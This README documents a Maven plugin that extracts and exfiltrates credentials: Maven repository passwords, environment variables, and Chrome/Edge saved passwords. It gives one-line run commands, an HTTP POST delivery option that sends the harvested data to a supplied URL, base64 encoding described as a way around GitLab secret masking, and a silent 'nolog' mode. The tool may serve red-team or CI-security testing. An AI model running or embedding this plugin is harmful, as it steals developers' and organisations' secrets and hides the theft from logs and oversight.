# maven-password
Maven plugin to extract password from different source:
- maven settings (repositories and mirror password)
- env
- chrome/edge

## Usage
(no installation needed)
Requirement:
- a working maven install (JAVA_HOME, path, etc...)
```
mvn ninja.stealing:maven-password:0.0.4:dump
```

## Install (for source/debug)
```
git clone https://github.com/tr4l/maven-password.git
cd maven-password
mvn install
```

## Changelog

### 0.0.4

Added export for chrome password
- Windows: with and without DPAPI
- Windows: With and without a master key
- Linux: with the default Linux  master key
Added http delivery method
Added different logger (incuding nolog)
### 0.0.3

Added export of env variable 
Added b64 export (to avoid [MASKED] protection in gitlab)
Added Delivery interface. Only supporting log on first release
Added json export


## Advanced usage

Some example of advanced usage

### Changing/choosing logger

```
mvn ninja.stealing:maven-password:0.0.4:dump -Dlogger=nolog
```

Possible logger:
- nolog: no log. Even for the log delivery
- maven:(default) Use builtin maven logging
- system: write log using System.out

### Choose extractor

```
mvn ninja.stealing:maven-password:0.0.4:dump -Dextract='maven,env'
```
Possible extractor:
- all:(default) Use all extractor
- maven: Extract maven information
- env: Extract environment variables
- chrome: Extract chrome/edge password

### Choose delivery

```
mvn ninja.stealing:maven-password:0.0.4:dump -Ddelivery=http -Durl="http://127.0.0.1:8080/xxx"
```

Possible delivery:
- log:(default) Deliver extraction trough log
- http: Deliver extraction trough http POST request. This need an url parameter
- all: all of the above

## todo
- private keys
- sample settings
- maven root password?
- eclipse?


